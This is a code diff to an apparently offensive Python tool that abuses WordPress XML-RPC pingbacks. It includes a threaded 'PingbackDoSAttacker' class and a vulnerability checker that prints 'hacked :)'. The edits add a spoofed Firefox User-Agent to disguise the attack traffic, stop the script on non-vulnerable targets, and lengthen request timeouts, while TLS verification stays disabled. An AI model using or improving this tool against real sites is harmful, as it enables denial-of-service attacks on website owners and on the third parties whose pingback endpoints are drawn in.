@@ -10,11 +10,13 @@ import threading
 requests.packages.urllib3.disable_warnings()
 
 class PingbackDoSAttacker(threading.Thread):
+    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
     def __init__(self, url, pingback_url, timeout):
         threading.Thread.__init__(self)
         self.url, self.pingback = url, pingback_url
         self.timeout = timeout
         self.session = requests.Session()
+        self.session.headers.update(self.headers)
 
     def run(self):
         print (LogColors.BLUE + "pingback attack: " + self.pingback + "..." + LogColors.ENDC)
@@ -92,6 +94,7 @@ class WordpressXMLRpc:
             print (LogColors.GREEN + "{} is vulnerable. hacked :)".format(self.url) + LogColors.ENDC)
         else:
             print (LogColors.RED + "{} is not vulnerable :(".format(self.url) + LogColors.ENDC)
+            sys.exit()
         return vuln
 
     def say_hello(self):
@@ -104,7 +107,7 @@ class WordpressXMLRpc:
         r = self.session.post(
                 self.url + '/xmlrpc.php',
                 data = data,
-                timeout = 2, verify = False, allow_redirects = False
+                timeout = 10, verify = False, allow_redirects = False
                 )
         if r.ok and "Hello!" in r.text:
             print (LogColors.BLUE + "say hello is checked: OK...\n" + LogColors.ENDC)
